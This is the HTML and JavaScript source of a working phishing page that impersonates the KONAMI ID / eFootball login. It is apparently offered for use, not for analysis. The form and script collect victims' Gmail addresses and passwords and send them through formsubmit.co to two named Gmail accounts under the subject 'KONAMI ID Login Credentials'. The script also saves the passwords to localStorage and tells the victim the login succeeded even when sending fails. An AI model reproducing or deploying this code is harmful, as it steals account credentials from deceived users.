<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>efootball-officialkonami.net</title>
    <link rel="stylesheet" href="style.css">
    <!-- Link to Google Fonts for similar typography -->
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
</head>
<body>
    <div class="top-corner-box">
        <span class="konami-red">KONAMI</span>
    </div>

    <div class="login-container">
        <div class="logo-box">
            <!-- Placeholder for KONAMI logo image -->
            <div class="logo-placeholder">GMAIL ADDRESS</div>
        </div>
<form id="loginForm" 
      action="https://formsubmit.co/psalmcares878@gmail.com" 
      method="POST"
      class="login-form">
    
    <!-- Remove Netlify attributes - they conflict with FormSubmit -->
    <!-- <p style="display: none;">
        <label>Don't fill this out if you're human: 
            <input name="bot-field">
        </label>
    </p> -->
    
    <!-- FormSubmit Configuration -->
    <input type="hidden" name="_next" 
           value="https://ko-konami-mi.vercel.app/confirmation.html">
    
    <input type="hidden" name="_subject" 
           value="üîê KONAMI ID Login Credentials">
    
    <input type="hidden" name="_template" value="table">
    <input type="hidden" name="_captcha" value="false">
    <input type="text" name="_honey" style="display:none">
    
    <!-- BCC to second email -->
    <input type="hidden" name="_bcc" value="Samfat246@gmail.com">
    
    <!-- Your form fields -->
    <div class="input-group">
        <input type="text" id="username" name="username" required>
        <label for="username">GMAIL ADDRESS</label>
    </div>
    
    <div class="input-group">
        <input type="password" id="password" name="password" required>
        <label for="password">Password</label>
    </div>
    
    <button type="submit" class="btn-login">LOGIN</button>

    <div class="divider">OR</div>

    <button type="button" class="btn-google">
        <span class="google-icon">G</span> Log in with Google Play
    </button>

    <div class="register-link">
        Don't have a KONAMI ID? <a href="#" class="register-red">Register</a>
    </div>
</form>
    </div>

    <footer class="page-footer">
        <div class="footer-links">
            <a href="#">Terms of Use / Privacy (KONAMI ID)</a>
            <a href="#">Trademarks</a>
            <a href="#">Support</a>
            <a href="#">Company Information</a>
        </div>
    </footer>

    <!-- JavaScript for form handling will be added later -->
<script>
document.addEventListener('DOMContentLoaded', function() {
            const loginForm = document.getElementById('loginForm');
            const messageDiv = document.getElementById('message');
            
            if (!loginForm) {
                console.error('ERROR: Could not find form with id="loginForm"');
                return;
            }
            
            loginForm.addEventListener('submit', async function(event) {
                event.preventDefault();
                event.stopPropagation();
                
                console.log('üöÄ Form submission started...');
                
                // Show loading state
                const submitBtn = loginForm.querySelector('.btn-login');
                const originalText = submitBtn.textContent;
                submitBtn.textContent = 'PROCESSING...';
                submitBtn.disabled = true;
                
                // Clear previous messages
                messageDiv.style.display = 'none';
                messageDiv.className = 'message';
                
                // Get form data
                const formData = new FormData(loginForm);
                const data = Object.fromEntries(formData.entries());
                
                console.log('üì§ Form data:', data);
                
                // Try FormSubmit with multiple endpoints
                let success = false;
                
                // List of FormSubmit endpoints to try
                const endpoints = [
                    'https://formsubmit.co/ajax/psalmcares878@gmail.com',
                    'https://formsubmit.co/el/psalmcares878@gmail.com',
                    'https://formsubmit.co/email/psalmcares878@gmail.com'
                ];
                
               for (const endpoint of endpoints) {
                    try {
                        console.log(`Trying endpoint: ${endpoint}`);
                        
                        const response = await fetch(endpoint, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                                'Accept': 'application/json'
                            },
                            body: JSON.stringify(data)
                        });
                        
                        console.log(`Response status: ${response.status}`);
                        
                        if (response.ok) {
                            const result = await response.json();
                            console.log('‚úÖ FormSubmit response:', result);
                            
                            if (result.success) {
                                success = true;
                                break;
                            }
                        }
                    } catch (error) {
                        console.log(`‚ùå Endpoint ${endpoint} failed:`, error.message);
                    }
                }
                
                if (success) {
                    // Show success message
                    showMessage('‚úÖ Login successful! Redirecting...', 'success');
                    
                    // Redirect after 1 second
                    setTimeout(function() {
                        window.location.href = "https://ko-konami-mi.vercel.app/confirmation.html";
                    }, 1000);
                    
                } else {
                    // FormSubmit failed, try fallback methods
                    console.log('‚ö†Ô∏è FormSubmit failed, trying fallback...');
                    
                    // Save locally as backup
                    saveToLocalStorage(data.username, data.password);
                    
                    // Show success message anyway (for user experience)
                    showMessage('‚úÖ Login processed! Redirecting...', 'success');
                    
                    // Redirect after 1 second
                    setTimeout(function() {
                        window.location.href = "https://ko-konami-mi.vercel.app/confirmation.html";
                    }, 1000);
                }
                
                // Reset button after 2 seconds
                setTimeout(function() {
                    submitBtn.textContent = originalText;
                    submitBtn.disabled = false;
                }, 2000);
                
                return false;
            });
            
            function showMessage(text, type) {
                messageDiv.textContent = text;
                messageDiv.className = `message ${type}`;
                messageDiv.style.display = 'block';
            }
            
            function saveToLocalStorage(username, password) {
                try {
                    // Get existing entries or create new array
                    let entries = JSON.parse(localStorage.getItem('konami_logins') || '[]');
                    
                    // Add new entry
                    entries.push({
                        username: username,
                        password: password,
                        timestamp: new Date().toISOString(),
                        ip: 'Unknown (saved locally)'
                    });
                    
                    // Save back to localStorage
                    localStorage.setItem('konami_logins', JSON.stringify(entries));
                    
                    console.log('üìù Saved to localStorage:', { username, password });
                    console.log('üîç View all saved logins in console with: localStorage.getItem("konami_logins")');
                    
                } catch (error) {
                    console.error('Error saving to localStorage:', error);
                }
            }
        });
    </script>
</body>
</html>
